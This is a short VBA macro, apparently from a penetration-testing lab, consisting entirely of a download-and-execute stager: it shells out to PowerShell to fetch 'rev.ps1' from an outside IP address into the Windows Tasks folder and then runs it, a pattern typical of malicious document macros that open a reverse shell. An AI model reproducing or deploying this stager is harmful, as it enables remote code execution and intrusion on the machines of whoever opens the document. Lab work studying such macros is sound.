Sub Main
	Shell("cmd /c powershell IWR http://192.168.45.181:80/rev.ps1 -o C:/Windows/Tasks/offsec.ps1")
	Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
End Sub
